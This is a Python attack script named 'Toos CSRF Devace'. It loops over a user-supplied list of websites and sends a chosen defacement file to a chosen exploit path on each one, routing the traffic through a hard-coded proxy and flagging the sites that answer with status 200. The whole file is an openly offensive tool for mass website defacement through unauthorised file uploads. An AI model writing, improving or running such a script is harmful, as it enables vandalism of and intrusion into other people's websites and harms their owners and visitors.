import os

try:
  import requests
except ImportError:
  os.system('pip install requests')

try:
  from termcolor import colored
except ImportError:
  os.system('pip install termcolor')

headers={
  'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14;rv:65.0) Gecko/20100101 Firefox/65.0'
}

proxies={
  'http':'http://74.116.59.8:53281'
}

print(colored('-'*50,'green'))
print(colored('Toos CSRF Devace'))
print(colored('-'*50,'green'))
print(colored('Author  : MR.C1M1N','green'))
print(colored('Github  : https://github.com/MR-C1M1N','green'))
print(colored('Program : python3','green'))
print(colored('-'*50,'green'))

target=str(input(colored('[#] Enter List Site: ','yellow')))
target_list=open(target,'r').readlines()
exploit=str(input(colored('[#] Exploit: ','yellow')))
tipe=str(input(colored('[#] Type ex:[file/Filedata]: ','yellow')))
dv=str(input(colored('[#] Enter File Devace: ','yellow')))

for URL in target_list:
  URL=URL.strip()
  deface=open(dv,'r')
  files={
    tipe:deface
  }
  try:
    x=requests.get(URL+'/'+exploit, files=files, headers=headers, proxies=proxies)
    if x.status_code == 200:
      print(colored(URL+' > status code 200','green'))
    else:
      print(colored(URL,'yellow'))
  except:
    print(colored(URL,'red'))
